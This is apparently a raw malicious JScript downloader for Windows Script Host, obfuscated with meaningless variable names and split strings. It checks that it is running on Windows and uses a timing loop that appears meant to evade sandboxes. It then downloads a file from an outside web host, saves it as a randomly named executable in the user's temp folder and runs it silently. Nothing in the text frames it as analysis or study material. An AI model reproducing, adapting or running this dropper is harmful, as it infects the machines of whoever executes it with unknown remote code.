var _H = false;
var _UI = "CreateObject";
var _WS = function _C() {return WScript[_UI]("WScript"+".Shell");}(), _W0 = 11;
var _TC = "MSXML2.XMLHTTP";
var _W = 2123213;
var _MB = 0;
function _S(_N1){_WS["Run"](_N1, _MB, _MB);};
function _V(){return _TC + "";};
function _Y(_B0, _M0){_MB = _MB * 1; return _B0 - _M0;};
function _YL(){return _UI;};
/*@cc_on
  @if (@_win32 || @_win64)
    _H = true;
  @end
@*/
if (_H)
{
var _N0 = "";
function _N(){return 22;};
var _G = 0; var _V1 = 0;
function _C0()
{
var _I = new this["Date"]();
var _C1 = _I["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _I = new this["Date"]();
var _V0 = _I["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _I = new this["Date"]();
var _GY = _I["getUTCMilliseconds"]();
var _G = "_YV";
_G = _Y(_V0, _C1);
var _V1 = "_R0";
_V1 = _Y(_GY, _V0);
_N0 = "open";
return _Y(_G, _V1);
}
var _RA = false;
var _CX = false;
for (var _RN = _MB; _RN < _N() * 1; _RN++){if (_C0() != _MB){
_RA = true; 
_V1 = "31" + 11 * _G + _V1; 
_CX = true; 
break;
}}
function _NG() {return ((_RA == true) && (_RA == _CX)) ? 1 : _MB;};
if (_RA && _NG() && _CX){
function _ZA() {return _WS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2tz403OnGxYPXaEW.ex" + "e";};
 _IW = _V();
 _I0 = WScript[_UI](_IW);
 var _M = 1;
 while (_M){
try {
	if (_M == 1)
	{
		_I0[_N0]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_I0["send"]();
		_DB = "Sleep";
	}
	WScript[_DB](_N() + 120); 
	if (_I0["readystate"] < 2 * 2) continue;
	_M = _MB;
	function _PJ(_R) {var _ZE = (1, 2, 3, 4, 5, _R); return _ZE;};
	_UM = WScript[_YL()]("ADODB.Stream");
	_IW = _UM;
	_IW[_N0]();
	_IW["type"] = _PJ(1);
	_IW["write"](_I0["ResponseBody"]);
	_UM["position"] = _PJ(_MB);
	_IW["Save" + "ToFile"](_ZA(), 2);
	_UM["cl"+"ose"]();
	_B = _ZA();
	_S(_B);
} catch(_MT){};
}
}
}

